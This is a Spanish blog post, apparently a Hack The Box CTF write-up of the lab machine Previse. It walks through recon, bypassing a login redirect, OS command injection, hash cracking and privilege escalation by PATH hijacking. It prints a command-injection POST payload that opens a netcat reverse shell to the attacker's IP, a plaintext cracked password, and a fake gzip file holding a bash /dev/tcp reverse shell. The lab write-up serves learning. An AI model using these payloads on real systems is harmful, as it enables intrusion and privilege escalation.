---
layout: post
title: Previse - Hack The Box
excerpt: "Máquina de estilo CTF con nivel fácil, donde bypasseamos redireccionamiento url, inyectamos comandos en peticiones POST, rompemos un hash y efectuamos PATH Hijacking para ejecutar comandos privilegiados en el sistema."
date: 2022-01-08
classes: wide
header:
  teaser: /assets/images/hackthebox/previse.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - BurpSuite
  - Pentesting
  - Privilege Escalation
  - Web Exploiting
tags:
  - Bypass
  - CTF
  - Nmap
  - os-injection
  - PATH Injection
---

<p align="center">
<img src="/assets/images/hackthebox/previse.png">
</p>

Hace muchísimo tiempo desde que creé mi cuenta en la plataforma HackTheBox (teniendo 1499 días desde que me registré), pero por diversas razones nunca había tenido el valor -ni el conocimiento- para practicar con las máquinas que ofrecen.
En aquel momento, no me imaginé que un futuro estaría escribiendo mi propio prodecimiento sobre cómo logré penetrar en dicha máquina, pero aquí estoy:

# ESCRIBIENDO MI PRIMER WRITE-UP

Antes de nada, quiero aclarar que estos posts los escribo y escribiré como una forma de preservar mis notas y conocimientos adquiridos.
Esta máquina está calificada como nivel fácil, se trata de una máquina de estilo CTF (poco realista) basada en explotación de vulnerabilidades genéricas.

## Fecha de Resolución

![Owned Date](/assets/images/htb-previse/owned_date.png)

En primer lugar y como en cualquier máquina, necesitamos información sobre el mismo así que vamos a hacer un reconocimiento para identificar los posibles vectores de entrada.

## Fase de Reconocimiento

Asignamos un virtualhost a la máquina en nuestro archivo `/etc/hosts` por motivos de comodidad. Es una buena práctica a mi parecer.

```console
wildzarek@p3ntest1ng:~$ sudo echo '10.10.11.104 previse.htb' >> /etc/hosts
```

Y ahora sí, ya podemos empezar con el reconocimiento de puertos. Primero realizamos un `SYN Port Scan`

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea el rango completo de puertos (hasta el 65535)    |
| -sS       | Realiza un escaneo de tipo SYN port scan                 |
| --min-rate | Enviar paquetes no más lentos que 5000 por segundo |
| --open    | Mostrar sólo los puertos que esten abiertos              |
| -vvv      | Triple verbose para ver en consola los resultados        |
| -n        | No efectuar resolución DNS                               |
| -Pn       | No efectuar descubrimiento de hosts                      |
| -oG       | Guarda el output en un archivo con formato grepeable para usar la funcion [extractPorts](https://pastebin.com/tYpwpauW) de [S4vitar](https://s4vitar.github.io/)

```console
wildzarek@p3ntest1ng:~$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.104 -oG allPorts
```

![Nmap Scan 1](/assets/images/htb-previse/nmap1.png)

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)**: SSH o Secure Shell |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Servidor_web)**: Servidor web |

Identificamos dos puertos abiertos, vamos a obtener más información con un escaneo específico sobre los puertos que hemos encontrado.

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escanea sobre los puertos especificados                |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Determina la versión del servicio                      |
| -oN       | Guarda el output en un archivo con formato normal      |

```console
wildzarek@p3ntest1ng:~$ nmap -sCV -p22,80 10.10.11.104 -oN targeted
```

![Nmap Scan 2](/assets/images/htb-previse/nmap2.png)

Vemos que hay un servidor web corriendo bajo el puerto **80** así que vamos a tratar de obtener más información de este recurso.

| Parámetro | Descripción |
| --------- | :---------- |
| --script  | Ejecución de scripts escritos en LUA. Usamos **http-enum** |
| -p        | Escanea sobre el puerto especificado |
| -oN       | Guarda el output en un archivo con formato normal |

```console
wildzarek@p3ntest1ng:~$ nmap --script http-enum -p80 10.10.11.104 -oN webScan
```

![Nmap Scan 3](/assets/images/htb-previse/nmap3.png)

```console
wildzarek@p3ntest1ng:~$ whatweb http://previse.htb/
```

![whatweb](/assets/images/htb-previse/whatweb.png)

He recortado la imagen porque la parte derecha no contiene información relevante.
Lo importante es que sabemos que existe un sistema de login, así que vamos a echarle un ojo.

![Login](/assets/images/htb-previse/login.png)

Probamos a loguearnos con datos genéricos, usuario `admin` y password `123456`, sin éxito.

![Login fallido](/assets/images/htb-previse/loginfailed.png)

Investiguemos un poco más para intentar listar posibles directorios expuestos.
Para ello podemos usar cualquiera de las siguientes herramientas: **gobuster**, **dirb**, **ffuf**, **wfuzz**, entre otras.
Puedes usar la que más te guste, yo personalmente prefiero `wfuzz`. Yo acostumbro a enviar los errores al `/dev/null` porque no me interesan.
En este caso estoy utilizando un diccionario pequeño, si no encontrasemos nada tiraremos de otro más grande.

```console
wildzarek@p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc=404 http://previse.htb/FUZZ 2>/dev/null
```

![wfuzz de directorios](/assets/images/htb-previse/wfuzz1.png)

Cuando abrimos la web en el navegador, vemos que automáticamente nos redirecciona (codigo 302) a `login.php`
Podemos deducir que habrá más archivos de este tipo, así que vamos a fuzzear la web en busca de más archivos de este tipo.

```console
wildzarek@p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc=404 http://previse.htb/FUZZ.php 2>/dev/null
```

![wfuzz de archivos](/assets/images/htb-previse/wfuzz2.png)

Vemos que existe un `nav.php`, he elegido este archivo porque tenemos acceso (código 200) además de contener habitualmente el menú de navegación.

![nav.php](/assets/images/htb-previse/navphp.png)

## Fase de Explotación

Tras probar cada enlace, todos me redireccionan (codigo 302) a `login.php`. En este punto, nos fijamos en el enlace **CREATE ACCOUNT** que apunta al recurso `accounts.php` 
Vamos a interceptar las peticiones con `BurpSuite` para tratar de llegar al recurso.

![BurpSuite](/assets/images/htb-previse/burp1.png)

Modificamos el código **302** por **200** para lograr el bypass del redireccionamiento, hacemos click en **Forward** y pa' dentro.

![BurpSuite](/assets/images/htb-previse/burp2.png)

![Login Bypass](/assets/images/htb-previse/bypassed.png)

Registramos una cuenta nueva. Yo puse como usuario `any0ne` y como password `123456`. Una vez registrado, iniciamos sesión.

![Logged](/assets/images/htb-previse/logged.png)

Se observa que tenemos un sistema de subida de archivos y que existe un archivo llamado `sitebackup.zip`. Vamos a descargarlo y descomprimirlo para ver qué contiene.

```console
wildzarek@p3ntest1ng:~$ unzip siteBackup.zip
```

![siteBackup.zip](/assets/images/htb-previse/sitebackup.png)

El primer archivo que me llama la atención es `config.php` puesto que habitualmente contiene las credenciales de conexión a la base de datos.

![config.php](/assets/images/htb-previse/configphp.png)

Analizando un poco más la página, haciendo click sobre `MANAGEMENT MENU` vemos la opción '**Log Data**' que nos lleva a la siguiente página:

![file_logs.php](/assets/images/htb-previse/filelogs.png)

Como tenemos el backup del sitio, vamos a analizar el archivo `logs.php`

![logs.php](/assets/images/htb-previse/logsphp.png)

Vemos una llamada a un script Python de nombre `log_process.py` mediante la función `exec` de PHP, que recibe un argumento mediante POST.
Sin embargo no hay ningún tipo de validación ni sanitización respecto a qué puede contener dicho argumento, por lo que el código es vulnerable a **[OS command injection](https://portswigger.net/web-security/os-command-injection)**

Capturando con `BurpSuite` la petición tras darle al boton **SUBMIT** vemos que está formada por el campo con nombre `delim` y su valor.

![BurpSuite](/assets/images/htb-previse/burp6.png)

Volvamos a usar `BurpSuite` para lograr inyectar la shell reversa usando el delimitador `comma` mediante el método POST.
Antes de enviarla me pongo a la escucha por el puerto **9999** con netcat (es el que yo uso habitualmente).

```
delim=comma%26nc+-e+/bin/bash+10.10.14.253+9999
```

```console
wildzarek@p3ntest1ng:~$ nc -nlvp 9999
```

Vamos a mejorar un poco la shell para mayor comodidad, escribiendo lo siguiente:

```console
wildzarek@p3ntest1ng:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![Shell](/assets/images/htb-previse/shell.png)

Anteriormente obtuvimos credenciales de la base de datos analizando el archivo `config.php` así que vamos a echar un vistazo a la base de datos.

```console
wildzarek@p3ntest1ng:~$ mysql -h localhost -u root -p previse
```

![Database mySQL](/assets/images/htb-previse/dbconnection.png)

![Database mySQL](/assets/images/htb-previse/dbdump.png)

Vemos las credenciales del usuario '**m4lwhere**' en forma de hash así que toca crackear la contraseña.
Pero antes vamos a fijarnos en un detalle del hash ya que es importante:

Mientras estamos en la terminal, los caracteres detrás del segundo $ se convierten, perdiendo su identidad. Esto se debe a que estamos ante un `Salted Hash`
El hash correcto es como sigue y lo vamos a romper con `John The Ripper` (esto tardará un rato):

```console
wildzarek@p3ntest1ng:~$ echo '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.' > hashfile
wildzarek@p3ntest1ng:~$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hashfile

Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovecody112235! (?)
1g 0:00:18:31 DONE (2022-01-08 20:44) 0.000899g/s 6670p/s 6670c/s 6670C/s ilovecody31..ilovecody..
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Tenemos la contraseña con la cual ya podemos probar a conectarnos por SSH.

```console
wildzarek@p3ntest1ng:~$ sshpass -p "ilovecody112235!" ssh m4lwhere@previse.htb
```

![SSH Connection](/assets/images/htb-previse/sshconnection.png)

Ahora vamos con lo realmente importante, la escalada de privilegios para obtener acceso como el usuario root.

# Escalada de Privilegios

![Privillege Scalation](/assets/images/htb-previse/scalation1.png)

Vemos que tenemos permiso de ejecución sobre un script python, vamos a ver qué contiene y cómo está construido el script:

![Privillege Scalation](/assets/images/htb-previse/scalation2.png)

Después de analizarlo, parece que el script es vulnerable a `PATH Injection` así que exportamos el PATH añadiendo `.:` al principio.

![Privillege Scalation](/assets/images/htb-previse/scalation3.png)

Ahora podemos crear un archivo llamado `gzip` en `/tmp` porque el script está siendo ejecutado con permisos de root utilizando la herramienta **gzip**.
Vamos a suplantar dicha herramienta para que lo que ejecute el script `access_backup.sh` sea nuestro falso **gzip**, que contendrá nuestra shell reversa.
Primero nos ponemos a la escucha en nuestra máquina con `nc -nlvp 9999`

```console
m4lwhere@previse:~$ cd /tmp
m4lwhere@previse:/tmp$ echo "bash -i >& /dev/tcp/10.10.14.253/9999 0>&1" > gzip
m4lwhere@previse:/tmp$ chmod +x gzip
m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh
```

Y estamos dentro. Tenemos privilegios de root y la máquina es nuestra.

![PWNED](/assets/images/htb-previse/pwned.png)

## ¡Gracias por leer hasta el final!

### Este ha sido mi primer write-up y espero que sea el primero de muchos más.

Una máquina facilita e interesante que nos enseña dos vulnerabilidades genéricas y la importancia de escribir código fuente sanitizado.
Espero que os haya gustado y nos vemos en el siguiente ;)